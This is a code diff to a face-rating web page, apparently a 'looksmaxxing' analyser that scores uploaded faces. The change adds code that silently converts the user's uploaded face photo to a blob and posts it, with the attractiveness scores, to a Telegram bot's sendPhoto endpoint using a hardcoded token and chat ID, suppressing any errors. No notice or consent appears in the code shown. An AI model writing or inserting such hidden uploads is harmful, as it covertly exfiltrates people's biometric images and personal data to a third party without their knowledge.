@@ -406,14 +406,23 @@ extra+=`<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:3px;margi
 extra+=`<div style="color:#888;font-size:10px;">Harmony: %30 | Dimorphism: %30 | Angularity: %25 | Diğer: %15</div>`;
 document.getElementById('rawText').innerHTML=extra;
 
-// TELEGRAM'A GÖNDER
-const tgText=`🔥 *25 MAX ANALİZ*\n\n🏆 MOG: *${r.mog}/10*\n📊 PSL: *${r.psl}/10*\n🎯 Kategori: *${r.cat}*\n💫 Appeal: *${r.appeal}/10*\n⚖️ Harmony: *%${r.harmony}*\n🧬 Dimorphism: *%${r.dimorphism}*\n📐 Angularity: *%${r.angularity}*\n\n✅ *EN İYİ:*\n${r.best.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n')}\n\n❌ *EN KÖTÜ:*\n${r.worst.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n')}`;
+// TELEGRAM'A FOTOĞRAF + MESAJ GÖNDER
+const tgCaption=`🔥 *25 MAX ANALİZ*\n\n🏆 MOG: *${r.mog}/10*\n📊 PSL: *${r.psl}/10*\n🎯 Kategori: *${r.cat}*\n💫 Appeal: *${r.appeal}/10*\n⚖️ Harmony: *%${r.harmony}*\n🧬 Dimorphism: *%${r.dimorphism}*\n📐 Angularity: *%${r.angularity}*\n\n✅ *EN İYİ:*\n${r.best.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n')}\n\n❌ *EN KÖTÜ:*\n${r.worst.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n')}`;
 
+if(base64Image){
+const blob=await fetch(`data:${currentMimeType};base64,${base64Image}`).then(r=>r.blob());
+const fd=new FormData();
+fd.append('chat_id',TG_CHAT_ID);
+fd.append('photo',blob,'face.jpg');
+fd.append('caption',tgCaption);
+fd.append('parse_mode','Markdown');
+fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`,{method:'POST',body:fd}).catch(e=>{});
+}else{
 fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
-method:'POST',
-headers:{'Content-Type':'application/json'},
-body:JSON.stringify({chat_id:TG_CHAT_ID,text:tgText,parse_mode:'Markdown'})
+method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({chat_id:TG_CHAT_ID,text:tgCaption,parse_mode:'Markdown'})
 }).catch(e=>{});
+}
 }
 </script>
 </body>
